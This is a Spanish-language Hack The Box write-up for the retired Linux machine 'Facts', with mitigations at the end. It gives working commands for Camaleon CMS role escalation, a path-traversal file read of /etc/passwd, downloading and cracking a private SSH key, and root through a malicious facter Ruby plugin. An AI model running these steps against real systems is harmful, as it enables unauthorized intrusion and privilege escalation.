---
machine: Facts
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, camaleon, cve, minio, ssh-key, facter]
---

# Facts — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Camaleon CMS 2.9.0 con registro abierto en `/admin/register`. Se crea una cuenta y se escala a administrador con CVE-2025-2304, que además filtra las credenciales de un MinIO interno. Un LFI (CVE-2024-46987) lee `/etc/passwd` y la flag de usuario. MinIO escucha en 54321 y guarda un backup de un home que incluye la clave SSH privada de `trivia`; se rompe la passphrase y se entra como `trivia`. `sudo facter --custom-dir` ejecuta Ruby como root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 9.9p1 Ubuntu
80/tcp  http  nginx 1.26.3 → facts.htb
54321/tcp http MinIO (S3)
```

```bash
echo "<IP> facts.htb" | sudo tee -a /etc/hosts
```

El puerto 54321 no aparece en el top 1000; sin `-p-` se pierde la mitad del reto.

## Enumeración

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 40
```

```text
/admin       (301) → /admin/login
/admin/register (200)
/search, /robots.txt, /sitemap, /up
```

El pie del panel confirma `Version 2.9.0`.

```bash
searchsploit camaleon
```

- CVE-2023-30145 — SSTI en `formats`, parcheado en 2.9.0.
- CVE-2024-46987 — path traversal autenticado / lectura de ficheros.
- CVE-2024-46986 — escritura arbitraria, bloqueada en 2.9.0.
- CVE-2025-2304 — **mass assignment** en el endpoint de actualización de usuario: añadir `user[role]=admin` a la petición de cambio de contraseña asciende la cuenta y expone las credenciales S3 del panel.

## Foothold

```bash
curl -s -X POST http://facts.htb/admin/register \
  -d 'user[username]=aaa&user[email]=aaa@local&user[password]=aaa&user[password_confirmation]=aaa'
```

Con la cuenta creada:

```bash
python3 exploit.py -u http://facts.htb -U aaa -P aaa --newpass bbb
python3 exploit.py -u http://facts.htb -U aaa -P bbb -e
```

```text
s3 access key: <key>
s3 secret key: <secret>
s3 endpoint:   http://localhost:54321
```

LFI para leer el sistema:

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l aaa -p bbb /etc/passwd
# el endpoint real es /admin/media/download_private_file?file=../../../../../../etc/passwd
```

```text
trivia:x:1000:1000:...
william:x:1001:1001:...
```

La clave del backup pertenece a `trivia` (lo confirman el comentario `trivia@facts.htb` y `ssh-keygen -y`). El LFI llega al mismo home, así que también permite leer la flag de usuario sin pasar por MinIO.

## Movimiento lateral

El endpoint es interno (`localhost`), pero el puerto está publicado:

```bash
AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
  aws --endpoint-url http://facts.htb:54321 s3 ls
```

```text
randomfacts
internal
```

```bash
AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY='<secret>' \
  aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
# id_ed25519
# authorized_keys
```

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
ssh2john id_ed25519 > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt   # passphrase de diccionario
```

Para saber a qué usuario pertenece la clave:

```bash
ssh-keygen -y -f id_ed25519
```

La pública coincide con la de `trivia` en `authorized_keys`.

```bash
chmod 600 id_ed25519
ssh trivia@facts.htb -i id_ed25519
```

## Escalada de privilegios

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

`facter` carga ficheros Ruby de un directorio arbitrario antes de recolectar hechos:

```bash
mkdir -p /tmp/f
cat > /tmp/f/pwn.rb <<'EOF'
Facter.add(:pwn) do
  setcode do
    system("/bin/bash")
  end
end
EOF
sudo /usr/bin/facter --custom-dir /tmp/f
```

## Evidencia

- Cuenta creada y rol de admin en el panel.
- `s3 ls` con los buckets (credenciales redactadas).
- `id` como `trivia` y después `root`.

## Lecciones aprendidas

- El registro abierto en el panel de un CMS es un foothold, no una función.
- Un CVE de escalada de rol puede traer credenciales de otro servicio: leer todas las opciones del exploit.
- Los backups en object storage contienen claves privadas; el bucket `internal` era el home de un usuario.
- `ssh-keygen -y` identifica al dueño de una clave comparando con `authorized_keys`.
- `facter --custom-dir` ejecuta Ruby arbitrario; cualquier binario que cargue plugins desde una ruta controlable es root si está en sudoers.

## Mitigaciones y detección

- Cerrar el registro público del panel y exigir invitación.
- Actualizar Camaleon CMS; 2.9.0 acumula cuatro CVE.
- No exponer MinIO en puertos públicos ni guardar claves privadas en buckets; cifrar y restringir por política.
- Passphrase fuerte en claves SSH y rotación al sospechar filtración.
- Sacar `facter` de sudoers o fijar `--custom-dir` a una ruta de solo lectura.
- Detección: registros en `/admin/register`, accesos a `54321` desde fuera, descargas de `.ssh/`, ejecución de `facter` como root.
- MITRE: T1133, T1552.001, T1552.004.

## Referencias

- CVE-2024-46987, CVE-2025-2304 (Camaleon CMS).
- Documentación de Facter sobre `--custom-dir`.
- MITRE ATT&CK: T1552.001, T1552.004.
